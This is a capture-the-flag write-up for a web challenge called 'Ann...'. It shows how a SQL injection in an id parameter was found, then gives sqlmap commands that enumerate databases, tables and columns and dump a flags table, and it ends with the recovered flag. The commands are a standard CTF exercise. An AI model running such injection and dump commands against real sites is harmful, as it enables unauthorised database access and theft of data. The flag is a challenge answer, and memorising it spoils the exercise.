## Ann... 300pt

### Problem
> PPAP  
> <http://133.242.234.142/ann/?id=1>


### Answer
Changing the ID Number, the user information is switched.  


![Ann...PPAP](https://github.com/takuzoo3868/noctf/blob/master/13_Ann.../shot01.JPG?raw=true)  


[**Ah ^~ My heart will be hopping ^~~~**](http://dic.nicovideo.jp/a/%E3%81%82%E3%81%81%5E%E3%80%9C%E5%BF%83%E3%81%8C%E3%81%B4%E3%82%87%E3%82%93%E3%81%B4%E3%82%87%E3%82%93%E3%81%99%E3%82%8B%E3%82%93%E3%81%98%E3%82%83%E3%81%81%5E%E3%80%9C)  


Extract database of a sql injection using sqlmap. (See logfile)


```bash
$ sqlmap.py -u "http://133.242.234.142/ann/?id=1" -dbs
```

Aha! Check the `I_h4v3_4_fl4g_4nn` of Tables.  
Just to be sure, I checked the tables of all databases.  


```bash
$ sqlmap.py -u "http://133.242.234.142/ann/?id=1" --tables
```

Ok. Found `flag` table. So extract data stored in the columns of table.


```bash
$ sqlmap.py -u "http://133.242.234.142/ann/?id=1" -D I_h4v3_4_fl4g_4nn -T flags --columns
$ sqlmap.py -u "http://133.242.234.142/ann/?id=1" -D I_h4v3_4_fl4g_4nn -T flags -C flag_is --dump
```


We did it!!


### Flag

`NoCTF{uni0n_sQ1_injecti0n_4nn}`
